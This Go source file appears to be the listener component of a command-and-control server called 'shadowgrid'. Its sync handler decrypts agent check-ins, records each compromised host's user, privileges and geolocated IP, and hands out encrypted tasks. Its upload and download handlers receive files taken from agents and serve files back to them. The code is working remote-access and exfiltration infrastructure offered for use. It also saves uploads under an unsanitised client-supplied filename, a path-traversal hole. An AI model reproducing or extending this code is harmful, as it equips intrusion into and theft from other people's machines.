package listener

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"shadowgrid/config"
	sgcrypto "shadowgrid/crypto"
	"shadowgrid/database"
	"shadowgrid/models"
)

type Handler struct {
	DB     *database.DB
	Config *config.Config
}

// IP enrichment cache to avoid re-querying ip-api.com
var (
	ipCache   = map[string]*ipAPIResponse{}
	ipCacheMu sync.Mutex
)

type ipAPIResponse struct {
	Status      string `json:"status"`
	Country     string `json:"country"`
	CountryCode string `json:"countryCode"`
	City        string `json:"city"`
	ISP         string `json:"isp"`
	AS          string `json:"as"`
	Query       string `json:"query"`
}

// getRealIP extracts the real client IP from proxy headers
func getRealIP(r *http.Request) string {
	// Cloudflare
	if ip := r.Header.Get("CF-Connecting-IP"); ip != "" {
		return ip
	}
	// X-Forwarded-For (first IP)
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		parts := strings.Split(xff, ",")
		return strings.TrimSpace(parts[0])
	}
	// X-Real-IP
	if ip := r.Header.Get("X-Real-IP"); ip != "" {
		return ip
	}
	// Fallback
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return host
}

// isPrivateIP returns true if the IP is a private/loopback/link-local address
func isPrivateIP(ipStr string) bool {
	ip := net.ParseIP(ipStr)
	if ip == nil {
		return true
	}
	privateRanges := []string{
		"10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
		"127.0.0.0/8", "169.254.0.0/16", "::1/128", "fc00::/7",
	}
	for _, cidr := range privateRanges {
		_, network, _ := net.ParseCIDR(cidr)
		if network.Contains(ip) {
			return true
		}
	}
	return false
}

// enrichIP looks up geo/ISP data for an IP and updates the agent record.
// Called in a goroutine; uses a cache to respect ip-api.com rate limits.
func enrichIP(db *database.DB, agentID, ipStr string) {
	if isPrivateIP(ipStr) {
		return
	}

	// Check cache
	ipCacheMu.Lock()
	if cached, ok := ipCache[ipStr]; ok {
		ipCacheMu.Unlock()
		db.Exec("UPDATE agents SET country=?, city=?, isp=?, asn=? WHERE id=?",
			cached.CountryCode, cached.City, cached.ISP, cached.AS, agentID)
		return
	}
	ipCacheMu.Unlock()

	url := fmt.Sprintf("http://ip-api.com/json/%s?fields=status,country,countryCode,city,isp,as,query", ipStr)
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		log.Printf("[ENRICH] Failed to query ip-api.com for %s: %v", ipStr, err)
		return
	}
	defer resp.Body.Close()

	var data ipAPIResponse
	if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {
		log.Printf("[ENRICH] Failed to decode ip-api.com response for %s: %v", ipStr, err)
		return
	}

	if data.Status != "success" {
		log.Printf("[ENRICH] ip-api.com returned status=%s for %s", data.Status, ipStr)
		return
	}

	// Cache the result
	ipCacheMu.Lock()
	ipCache[ipStr] = &data
	ipCacheMu.Unlock()

	db.Exec("UPDATE agents SET country=?, city=?, isp=?, asn=? WHERE id=?",
		data.CountryCode, data.City, data.ISP, data.AS, agentID)
	log.Printf("[ENRICH] %s → %s %s %s %s", ipStr, data.CountryCode, data.City, data.ISP, data.AS)
}

type syncRequest struct {
	Session string `json:"session"`
	TS      int64  `json:"ts"`
}

type agentPayload struct {
	ID      string            `json:"id"`
	Profile map[string]interface{} `json:"profile"`
	Results []resultPayload   `json:"results"`
}

type resultPayload struct {
	TaskID     int    `json:"task_id"`
	Output     string `json:"output"`
	OutputType string `json:"output_type"`
	Status     string `json:"status"`
}

type syncResponse struct {
	Tasks  []taskPayload     `json:"tasks"`
	Config map[string]interface{} `json:"config"`
}

type taskPayload struct {
	ID   int             `json:"id"`
	Type string          `json:"type"`
	Args json.RawMessage `json:"args"`
}

func (h *Handler) HandleSync(w http.ResponseWriter, r *http.Request) {
	var req syncRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad request", 400)
		return
	}

	// Try decrypting with all known AES keys from builds
	keys := h.getKnownKeys()
	var plaintext []byte
	var matchedKey string
	var err error
	for _, key := range keys {
		plaintext, err = sgcrypto.Decrypt(req.Session, key)
		if err == nil {
			matchedKey = key
			break
		}
	}
	if matchedKey == "" {
		log.Printf("[SYNC] Decrypt failed with all %d known keys", len(keys))
		http.Error(w, "unauthorized", 401)
		return
	}

	var payload agentPayload
	if err := json.Unmarshal(plaintext, &payload); err != nil {
		log.Printf("[SYNC] Invalid payload: %v", err)
		http.Error(w, "bad payload", 400)
		return
	}

	// Only upsert full profile when the agent sends one; otherwise just update last_seen
	if payload.Profile != nil && len(payload.Profile) > 0 {
		getString := func(m map[string]interface{}, key string) string {
			if v, ok := m[key]; ok {
				if s, ok := v.(string); ok {
					return s
				}
			}
			return ""
		}
		getFloat := func(m map[string]interface{}, key string) float64 {
			if v, ok := m[key]; ok {
				if f, ok := v.(float64); ok {
					return f
				}
			}
			return 0
		}
		getBool := func(m map[string]interface{}, key string) bool {
			if v, ok := m[key]; ok {
				if b, ok := v.(bool); ok {
					return b
				}
			}
			return false
		}

		agent := &models.Agent{
			ID:           payload.ID,
			Hostname:     getString(payload.Profile, "hostname"),
			Username:     getString(payload.Profile, "username"),
			OS:           getString(payload.Profile, "os"),
			Arch:         getString(payload.Profile, "arch"),
			ProcessName:  getString(payload.Profile, "process_name"),
			PID:          int(getFloat(payload.Profile, "pid")),
			IPInternal:   getString(payload.Profile, "ip_internal"),
			IPExternal:   getRealIP(r),
			Country:      getString(payload.Profile, "country"),
			DomainName:   getString(payload.Profile, "domain"),
			IsAdmin:      getBool(payload.Profile, "is_admin"),
			SleepSeconds: int(getFloat(payload.Profile, "sleep_seconds")),
			JitterPct:    int(getFloat(payload.Profile, "jitter_percent")),
			FirstSeen:    time.Now(),
			LastSeen:     time.Now(),
			Status:       "active",
		}

		h.DB.UpsertAgent(agent)
		// Enrich IP with geo data in background
		go enrichIP(h.DB, agent.ID, agent.IPExternal)
	} else {
		// No profile data — just register the agent ID if new, and update last_seen
		realIP := getRealIP(r)
		h.DB.EnsureAgent(payload.ID, realIP)
		h.DB.UpdateAgentLastSeen(payload.ID)
	}

	// Store results
	for _, res := range payload.Results {
		if res.OutputType == "" {
			res.OutputType = "text"
		}
		h.DB.CompleteTask(res.TaskID, res.Output, res.OutputType)
	}

	// Get pending tasks
	pendingTasks, _ := h.DB.GetPendingTasks(payload.ID)
	var taskPayloads []taskPayload
	for _, t := range pendingTasks {
		taskPayloads = append(taskPayloads, taskPayload{
			ID:   t.ID,
			Type: t.TaskType,
			Args: json.RawMessage(t.ArgsJSON),
		})
	}

	// Get agent config
	existingAgent, _ := h.DB.GetAgent(payload.ID)
	agentConfig := map[string]interface{}{
		"sleep":  5,
		"jitter": 20,
	}
	if existingAgent != nil {
		agentConfig["sleep"] = existingAgent.SleepSeconds
		agentConfig["jitter"] = existingAgent.JitterPct
	}

	resp := syncResponse{
		Tasks:  taskPayloads,
		Config: agentConfig,
	}

	respJSON, _ := json.Marshal(resp)
	encrypted, err := sgcrypto.Encrypt(respJSON, matchedKey)
	if err != nil {
		http.Error(w, "encryption error", 500)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"data": encrypted,
		"ts":   time.Now().Unix(),
	})
}

func (h *Handler) HandleUpload(w http.ResponseWriter, r *http.Request) {
	r.ParseMultipartForm(100 << 20)
	file, header, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "no file", 400)
		return
	}
	defer file.Close()

	uploadDir := filepath.Join(h.Config.DataDir, "agent_uploads")
	os.MkdirAll(uploadDir, 0755)

	ts := time.Now().UnixNano()
	localPath := filepath.Join(uploadDir, strconv.FormatInt(ts, 10)+"_"+header.Filename)
	dst, err := os.Create(localPath)
	if err != nil {
		http.Error(w, "save error", 500)
		return
	}
	defer dst.Close()
	written, _ := io.Copy(dst, file)

	agentID := r.FormValue("agent_id")
	f := &models.File{
		AgentID:   agentID,
		Filename:  header.Filename,
		Filepath:  r.FormValue("filepath"),
		Size:      written,
		Direction: "download", // from agent = download to us
		LocalPath: localPath,
	}
	h.DB.CreateFile(f)
	h.DB.LogActivity("file", "Agent "+agentID+" uploaded "+header.Filename)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

func (h *Handler) HandleDownload(w http.ResponseWriter, r *http.Request) {
	// Extract ID from URL path
	idStr := filepath.Base(r.URL.Path)
	id, err := strconv.Atoi(idStr)
	if err != nil {
		http.Error(w, "invalid id", 400)
		return
	}
	f, err := h.DB.GetFile(id)
	if err != nil {
		http.Error(w, "not found", 404)
		return
	}
	http.ServeFile(w, r, f.LocalPath)
}

// getKnownKeys returns all AES keys from completed builds + the server config key
func (h *Handler) getKnownKeys() []string {
	keys := []string{}
	// Always include the server's own key
	if h.Config.AESKey != "" {
		keys = append(keys, h.Config.AESKey)
	}
	// Pull keys from all builds in DB
	builds, err := h.DB.GetBuilds()
	if err != nil {
		return keys
	}
	seen := map[string]bool{}
	if h.Config.AESKey != "" {
		seen[h.Config.AESKey] = true
	}
	for _, b := range builds {
		configJSON, ok := b["config_json"].(string)
		if !ok {
			continue
		}
		var cfg map[string]interface{}
		if json.Unmarshal([]byte(configJSON), &cfg) != nil {
			continue
		}
		if key, ok := cfg["aes_key"].(string); ok && key != "" && !seen[key] {
			keys = append(keys, key)
			seen[key] = true
		}
	}
	return keys
}
